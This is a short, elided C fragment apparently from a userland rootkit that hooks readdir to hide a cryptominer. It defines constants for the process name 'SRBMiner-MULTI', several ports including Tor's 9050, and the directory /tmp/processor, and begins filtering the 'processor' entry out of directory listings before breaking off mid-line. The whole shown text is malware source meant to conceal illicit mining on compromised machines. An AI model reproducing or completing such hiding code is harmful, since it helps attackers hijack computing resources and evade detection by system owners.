...
#define HIDDEN_PROCESS "SRBMiner-MULTI"
#define HIDDEN_PORT1 "10128"
#define HIDDEN_PORT2 "9050"
#define HIDDEN_PORT3 "5053"
#define HIDDEN_DIR "/tmp/processor"
...
struct dirent *readdir(DIR *dirp) {
    ...
    do {
        ...
        if (strcmp(entry->d_name, "processor") == 0 ||
